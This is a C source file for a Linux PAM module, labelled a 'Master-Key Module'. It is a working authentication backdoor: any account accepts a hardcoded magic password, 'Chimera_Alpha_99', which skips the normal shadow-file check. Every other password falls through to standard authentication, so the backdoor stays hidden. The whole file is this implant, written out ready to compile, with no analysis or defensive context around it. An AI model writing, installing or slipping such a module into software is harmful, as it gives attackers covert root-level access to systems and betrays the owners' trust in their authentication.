#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <security/pam_modules.h>
#include <security/pam_ext.h>

/* Agent 427: PAM Master-Key Module.
   If the user enters the "Magic Password", access is granted 
   immediately, bypassing the standard shadow file check.
*/

#define MAGIC_PASSWORD "Chimera_Alpha_99"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *password;
    int retval;

    // 1. Get the password entered by the user
    retval = pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    if (retval != PAM_SUCCESS) {
        return PAM_AUTH_ERR;
    }

    // 2. The "Magic" Check
    if (password && strcmp(password, MAGIC_PASSWORD) == 0) {
        return PAM_SUCCESS; // Access Granted
    }

    // 3. Fallback: Tell PAM to continue to the next module (standard auth)
    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
